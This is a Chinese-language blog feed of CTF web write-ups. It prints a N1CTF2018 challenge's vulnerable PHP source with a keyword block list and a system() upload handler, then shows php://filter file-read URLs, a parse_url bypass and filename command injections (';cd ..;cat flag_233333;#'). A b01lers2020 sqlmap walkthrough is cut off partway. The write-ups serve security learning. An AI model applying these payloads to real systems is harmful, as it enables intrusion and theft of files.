class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: hacker.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"manage"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter_directory_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"manage"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ffffllllaaaaggg"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"info"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password"</span><span class="token punctuation">;</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+>&lt;"</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$whitelist</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean constant">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/<span class="token interpolation"><span class="token variable">$blacklist</span></span>/is"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select * from `albert_users` where `username_which_you_do_not_know`= '<span class="token interpolation"><span class="token variable">$user</span></span>' and `password_which_you_do_not_know_too` = '<span class="token interpolation"><span class="token variable">$pass</span></span>'"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>username_which_you_do_not_know<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>isadmin_which_you_do_not_know_too_too<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">updateadmin</span><span class="token punctuation">(</span><span class="token variable">$level</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '<span class="token interpolation"><span class="token variable">$level</span></span>' where `username_which_you_do_not_know`='<span class="token interpolation"><span class="token variable">$user</span></span>' "</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span><span class="token comment">//    die($res);</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('<span class="token interpolation"><span class="token variable">$user</span></span>','<span class="token interpolation"><span class="token variable">$pass</span></span>','0')"</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">insert_id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>上面有个奇怪的被过滤的字符串为<code>ffffllllaaaaggg</code><br><code>/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code><br>再次尝试读取的时候遭到了阻力，被检测跳到了<code>hacker.php</code>界面，这个可以根据<code>parse_str($uri[&#39;query&#39;], $query);</code>的解析漏洞来绕过</p><blockquote><p>上面的那个解析漏洞说的就是url的格式不能太离谱，太离谱就会返回false，就像下面的请求一样。<br><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn&#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;ffffllllaaaaggg#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p></blockquote><p>得到<code>ffffllllaaaaggg.php</code>文件内容<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can find sth in m4aaannngggeee"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn&#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;m4aaannngggeee#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>m4aaannngggeee.php</code><br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"templates/upload.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>访问<code>/templates/upload.html</code>是个上传文件的界面，上传个php文件试一试，果然不行，报错如下<br><pre class="line-numbers language-none"><code class="language-none">Not FoundThe requested URL &#x2F;templates&#x2F;upllloadddd.php was not found on this server.Apache&#x2F;2.4.7 (Ubuntu) Server at 8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn Port 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p><p>注意到<code>/templates/upllloadddd.php</code>文件，php伪协议拿到他的代码<br><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn&#x2F;&#x2F;user.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;upllloadddd#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>代码如下<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"gif"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"png"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"file upload success&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;img src='data:image/png;base64,"</span><span class="token punctuation">.</span><span class="token variable">$picdata</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>发现命令注入点<code>rce这不就来了嘛，不过nm这也太多文件了</code><br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>文件名就是上传的文件名，好了bp配合火狐一波注入测试，发起请求页面<br><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;8d685461-9fb9-4fb1-aab8-6b31ee37af4b.node3.buuoj.cn&#x2F;user.php?page&#x3D;m4aaannngggeee#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><code>upload.html</code>界面不可以，~自己做的时候大意了啊，妹想到，年轻题目，不讲武德~<br><img src="/2020/11/17/N1CTF2018/1.png" alt><br>这个命令就拼接为了<code>cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/;ls;</code><br>然后我们想看主目录就拼接命令为<code>cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/;cd /;ls;</code>，改filename为<code>;cd /;ls;#</code>，不行，<code>/被过滤了</code>，<code>;cd ..;ls;#</code>，回一级就到了根目录是我没有想到的。。。<br>注意到文件<code>flag_233333</code>，我们要拼接的命令就变为了<code>;cd ..;cat flag_233333;#</code><br><img src="/2020/11/17/N1CTF2018/2.png" alt></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>b01lers2020部分web复现</title>
      <link href="2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>期待一种阳光，温暖却不刺眼。</p></blockquote><h1 id="1-Life-on-Mars"><a href="#1-Life-on-Mars" class="headerlink" title="1.Life on Mars"></a>1.Life on Mars</h1><p>首先是个左侧为火星上面的各个地点的页面，可以点击页面跳转，猜测此过程中应该发生了sql查询。<br><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/1.png" alt></p><p>然后用bp抓包测试一下，点击看一下亚马逊平原的信息，抓包的时候抓到了请求，如下图：<br><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/2.png" alt><br><pre class="line-numbers language-query" data-language="query"><code class="language-query">&#x2F;query?search&#x3D;amazonis_planitia&amp;&#123;&#125;&amp;_&#x3D;1605531996491<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h2 id="1-sqlmap测试"><a href="#1-sqlmap测试" class="headerlink" title="1.sqlmap测试"></a>1.sqlmap测试</h2><p>好久没用过sqlmap了，这么强大的工具竟然有快大年没有用了，现在再次操起sqlmap开始，先查是否有注入点，用下面的语句</p><blockquote><p>测试所获得的结果都在对应语句之下的截图里面。</p></blockquote><h3 id="1-查注入点-amp-查数据库"><a href="#1-查注入点-amp-查数据库" class="headerlink" title="1.查注入点&amp;查数据库"></a>1.查注入点&amp;查数据库</h3><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;4f0ec106-cc04-4ba1-b28c-25a421ddfdd9.node3.buuoj.cn&#x2F;query?search&#x3D;amazonis_planitia --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/16/b01lers2020%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/3.png" alt="测试结果-查注入点"><br>可以看到确实能用sqlmap，那一般就也能用sqlmap一把梭了，这里看到了三个数据库，分别为<br><pre class="line-numbers language-none"><code class="language-none">available databases [3]:[*] alien_code[*] aliens[*] information_schema<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>下面再对上面的两个特别的数据库测试一下，看看那个可疑，感觉第一个<code>alien_code</code>有点可疑啊，那下面就先查她的表了。</p><h3 